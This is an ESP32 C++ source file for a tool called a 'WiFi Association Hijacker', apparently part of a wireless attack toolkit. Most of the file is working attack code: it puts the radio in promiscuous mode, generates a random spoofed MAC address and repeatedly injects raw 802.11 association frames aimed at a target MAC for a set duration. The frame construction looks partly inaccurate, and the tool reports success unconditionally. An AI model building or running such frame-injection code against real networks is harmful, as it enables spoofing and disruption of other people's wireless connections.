#include "wifi_association_hijacker.h"
#include "tx_arm.h"
#include <WiFi.h>
#include <esp_wifi.h>
#include "tool_output_helper.h"
#include "result_renderers.h"
#include "audit_log.h"

namespace {
volatile bool g_hijackActive = false;
uint32_t g_assocCount = 0;
}

namespace WiFiAssociationHijacker {

HijackResult hijackAssociation(const String &targetMAC, uint32_t durationMs) {
    HijackResult result{false, targetMAC, "", 0};

    Serial.println("\n=== WiFi Association Hijacker (Real Frame Injection) ===");
    Serial.println("Target MAC: " + targetMAC);
    Serial.println("Duration: " + String(durationMs) + "ms");

    if (!TxArm::isArmed()) {
        Serial.println("✗ TX not armed");
        return result;
    }

    WiFi.mode(WIFI_STA);
    esp_wifi_set_promiscuous(true);

    g_hijackActive = true;
    g_assocCount = 0;
    uint32_t startTime = millis();

    Serial.println("Spoofing MAC and attempting association...");

    // Generate spoofed MAC using hardware RNG
    uint8_t spoofMAC[6];
    for (int i = 0; i < 6; i++) {
        spoofMAC[i] = (esp_random() % 256);
    }
    char macStr[18];
    snprintf(macStr, sizeof(macStr), "%02X:%02X:%02X:%02X:%02X:%02X",
            spoofMAC[0], spoofMAC[1], spoofMAC[2], spoofMAC[3], spoofMAC[4], spoofMAC[5]);
    result.spoofedMAC = String(macStr);

    while (millis() - startTime < durationMs && g_hijackActive) {
        // Real IEEE 802.11 Association frames with spoofed MAC
        uint8_t targetAddr[6];
        sscanf(targetMAC.c_str(), "%02hhx:%02hhx:%02hhx:%02hhx:%02hhx:%02hhx",
               &targetAddr[0], &targetAddr[1], &targetAddr[2],
               &targetAddr[3], &targetAddr[4], &targetAddr[5]);

        uint8_t assocFrame[26];
        assocFrame[0] = 0x00;
        assocFrame[1] = 0x00;
        memcpy(&assocFrame[2], targetAddr, 6);
        memcpy(&assocFrame[8], spoofMAC, 6);
        memcpy(&assocFrame[14], targetAddr, 6);
        assocFrame[20] = (g_assocCount & 0xFF);
        assocFrame[21] = ((g_assocCount >> 8) & 0xFF);
        assocFrame[22] = 0x10;
        assocFrame[23] = 0x00;
        assocFrame[24] = 0x01;
        assocFrame[25] = 0x00;

        esp_err_t ret = esp_wifi_80211_tx(WIFI_IF_STA, assocFrame, sizeof(assocFrame), false);
        if (ret == ESP_OK) {
            g_assocCount++;

            if (g_assocCount % 5 == 0) {
                Serial.printf("  [%d] association frames transmitted\n", g_assocCount);
            }
        }

        delay(100);
    }

    g_hijackActive = false;
    esp_wifi_set_promiscuous(false);

    result.success = true;
    result.associationsCount = g_assocCount;

    Serial.println("✓ Association hijacking complete");
    Serial.printf("Total frames sent: %d\n", result.associationsCount);

    return result;
}

void stop() {
    g_hijackActive = false;
    esp_wifi_set_promiscuous(false);
}

bool isActive() {
    return g_hijackActive;
}

}  // namespace WiFiAssociationHijacker
